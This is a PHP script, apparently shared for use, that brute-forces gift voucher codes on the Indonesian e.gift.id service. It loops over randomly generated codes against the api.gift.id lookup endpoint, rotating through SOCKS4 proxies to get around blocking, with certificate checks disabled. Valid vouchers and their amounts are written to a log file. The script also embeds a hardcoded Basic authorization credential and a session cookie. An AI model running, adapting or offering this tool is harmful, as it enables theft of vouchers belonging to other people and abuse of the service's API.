<?php
$headers = array();
$headers[] = "Upgrade-Insecure-Requests: 1";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36";
$headers[] = "Connection: keep-alive";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
$headers[] = "Cookie: __cfduid=daf3a35eb4049a4bc73d9fc6eae46b9e81543254248";
$headers[] = "If-None-Match: ^^e9ed713183286a0d2ba736b8bb2a8d9e^^\"\"";
$headers[] = "If-Modified-Since: Mon, 12 Nov 2018 04:06:37 GMT";
$headers[] = "Referer: https://e.gift.id/u/83f5vbm5bdb46";
$headers[] = "Access-Control-Request-Method: GET";
$headers[] = "Origin: https://e.gift.id";
$headers[] = "Authority: api.gift.id";
$headers[] = "Access-Control-Request-Headers: authorization";
$headers[] = "Authorization: Basic VnFPZHhxTmo5cjNTQk1nNEdjMkNDdGs2czpWR2ZOOFNMNjVJSGNSNmtsTzlhOFJrcnhDMVUwaEttdEgySUgwaVZ0SnUxNGpNTUJnQQ==";
echo "      Bot Auto Search Voucher E.GIFT.ID\n";
echo "           YarzCode - Meds\n\n";
$socks = explode("\n", file_get_contents("socks.txt"));
$i=0;
foreach($socks as $proxy)
{ 
while(true)
{ 
$code  = "83".random()."46";
$kirik = curl('https://api.gift.id/v1/egifts/detail_by_code/'.$code, null, $headers, $proxy);
if(preg_match('/Access denied/', $kirik[0]))
{ 
	break;
	continue;
}
$np    = @json_decode($kirik[0]);
if(!isJson($kirik[0])) { 
    break;
    continue;
} else if(empty(@$np->message))
{ 
	if(@$np->status == 'used')
	{ 
		$status = 'Can use';
	} else { 
		$status = 'Need activate';
	}
	$amount = @$np->amount;
	if(empty($amount))
	{
	echo "[$i] DIE => https://e.gift.id/u/{$code} [".$np->message."] ".PHP_EOL;
	} else { 
	file_put_contents("logtada.txt", "\nhttps://e.gift.id/u/{$code} | Amount: {$amount} | Status: {$status}", FILE_APPEND);
	echo "[$i] LIVE => https://e.gift.id/u/{$code} [$amount] [$status]".PHP_EOL;
    }
} else {
		echo "[$i] DIE => https://e.gift.id/u/{$code} [".@$np->message."] ".PHP_EOL;
}
$i++;
}
}
function random($length = 9) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function isJson($string) {
    return ((is_string($string) &&
            (is_object(json_decode($string)) ||
            is_array(json_decode($string))))) ? true : false;
}
function curl($url, $fields = null, $headers = null, $proxy=null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($fields !== null) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($headers !== null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        if ($proxy !== null)
        { 
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
           curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
        }
        $result   = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return array(
            $result,
            $httpcode
        );
 }